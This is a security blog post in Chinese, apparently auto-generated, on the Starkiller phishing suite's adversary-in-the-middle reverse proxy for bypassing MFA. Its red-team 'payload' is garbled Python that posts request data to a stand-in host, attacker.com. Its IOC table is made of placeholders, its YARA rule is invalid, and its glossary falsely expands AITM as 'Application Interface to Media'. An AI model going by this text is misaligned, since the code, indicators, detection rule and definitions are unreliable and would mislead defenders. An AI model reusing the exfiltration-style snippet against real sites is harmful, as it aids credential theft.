---
layout: post
title:  "Starkiller Phishing Suite Uses AitM Reverse Proxy to Bypass Multi-Factor Authentication"
date:   2026-03-03 12:40:26 +0000
categories: [security]
severity: critical
---

# 🚨 Starkiller 攻擊平台：解析 MFA 繞過與 AITM 逆向代理技術

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: MFA 繞過與帳戶接管
> * **關鍵技術**: AITM 逆向代理、URL 短鏈、Headless Chrome

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Starkiller 攻擊平台利用 AITM 逆向代理技術，實現 MFA 繞過和帳戶接管。該技術允許攻擊者在不需要更新模板的情況下，實時代理合法的登錄頁面。
* **攻擊流程圖解**:
  1. 攻擊者註冊 Jinkusu 平台並選擇要模擬的品牌。
  2. 攻擊者使用 Headless Chrome 加載品牌的真實網站，並作為反向代理。
  3. 受害者訪問攻擊者的網站，實際上是訪問品牌的真實網站，但所有請求都通過攻擊者的反向代理。
  4. 攻擊者捕獲受害者的輸入和會話令牌，實現 MFA 繞過和帳戶接管。
* **受影響元件**: 所有使用 MFA 的網站和應用程序。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要註冊 Jinkusu 平台並選擇要模擬的品牌。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 設定品牌的真實網站 URL
    brand_url = "https://example.com/login"
    
    # 設定攻擊者的反向代理 URL
    proxy_url = "https://attacker.com/proxy"
    
    # 設定 Headless Chrome 的參數
    chrome_options = {
        "headless": True,
        "args": ["--no-sandbox", "--disable-gpu"]
    }
    
    # 加載品牌的真實網站
    response = requests.get(brand_url, headers={"User-Agent": "Mozilla/5.0"})
    
    # 將請求轉發到攻擊者的反向代理
    proxy_response = requests.post(proxy_url, data={"url": brand_url, "headers": response.headers})
    
    # 將反向代理的響應返回給受害者
    return proxy_response.text
    
    ```
* **繞過技術**: 攻擊者可以使用 URL 短鏈和 Headless Chrome 來繞過安全檢查。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | attacker.com | /proxy |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Starkiller_Attack {
        meta:
            description = "Starkiller 攻擊平台"
            author = "Your Name"
        strings:
            $proxy_url = "https://attacker.com/proxy"
        condition:
            $proxy_url in (http.request.uri)
    }
    
    ```
* **緩解措施**: 對所有請求進行嚴格的安全檢查，包括驗證 User-Agent 和 Referer 首部。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **AITM (Application Interface to Media)**: 一種允許應用程序與媒體之間進行通信的技術。
* **Headless Chrome**: 一種無頭瀏覽器，允許在無需顯示界面的情況下加載網頁。
* **MFA (Multi-Factor Authentication)**: 一種需要多個因素的身份驗證技術，包括密碼、生物特徵和令牌等。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/03/starkiller-phishing-suite-uses-aitm.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1189/)


